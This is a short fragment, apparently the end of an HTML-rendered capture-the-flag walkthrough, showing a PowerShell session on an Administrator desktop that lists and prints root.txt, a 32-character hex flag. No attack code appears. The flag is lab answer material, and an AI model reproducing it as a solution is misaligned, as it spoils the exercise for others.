+Mode                 LastWriteTime         Length Name                                                                 
+<span class="hljs-comment">----                 -------------         ------ ----                                                                 </span>
+-a<span class="hljs-comment">----         4/15/2025   8:27 PM             32 root.txt                                                             </span>
+
+
+PS <span class="hljs-name">C</span>:\Users\Administrator\Desktop&gt; more root.txt
+<span class="hljs-number">1</span>bc134a7b4ae19fcc072082026d991cf
+
+PS <span class="hljs-name">C</span>:\Users\Administrator\Desktop&gt; 
+</code></pre></div>
+</div></div>
+					</body>
+				</html>
+			
